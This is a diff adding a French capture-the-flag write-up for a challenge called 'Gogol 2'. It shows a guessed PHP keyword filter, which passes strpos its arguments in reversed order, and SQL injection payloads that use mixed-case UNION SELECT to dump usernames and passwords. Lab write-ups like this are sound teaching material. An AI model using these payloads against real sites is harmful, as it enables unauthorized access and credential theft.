@@ -73,3 +73,38 @@ Et le challenge est validé :)
 `INEAT{azerty-is-a-g00d-p4ssw0rd}`
 
 # Gogol 2
+
+Le second challenge propose une version "patchée" du code.  
+Bien évidemment, notre injection ne fonctionne plus, et nous n'avons cette fois plus accès au code source.
+
+On peut donc supposer qu'il s'agit de la même requête SQL en PHP et qu'il faudra également trouver un moyen de contourner les filtres mis en place par le webmaster (en aveugle cette fois, donc).
+
+On remarque que lorsqu'on essaye d'effectuer une injection basique, on obtient un message d'erreur `Hacker detected`. En réalité, une simple requête contenant les mots clés "union" ou "select" provoque l'affichage de ce message. On peut donc supposer que le code derrière ressemble maintenant à ça :
+
+```
+$filter = array('union', 'select', 'UNION', 'SELECT');
+
+// Remove all banned characters
+foreach ($filter as $banned) {
+    if (strpos($banned, $_GET['q']) !== false) {
+        echo "Hacker detected";
+        die();
+    }
+} 
+```
+ Or il s'avère que, contrairement à `preg_replace()`, la fonction `strpos()` est case sensitive - contrairement à notre requête SQL qui se fout royalement des minuscules/majuscules. On peut donc contourner le filtre relativement simpelment :
+
+```
+' and 0 UnioN SelECt 1,2,3#
+```
+![gogol2_1](gogol2_1.png)
+
+Il ne reste plus qu'à modifier légèrement notre requête précédente.
+
+```
+' and 0 UnioN SelECt username,password,3 from users#
+```
+
+![gogol2_2](gogol2_2.png)
+
+`INEAT{l0w3rC4s3_S3ns171v3}`
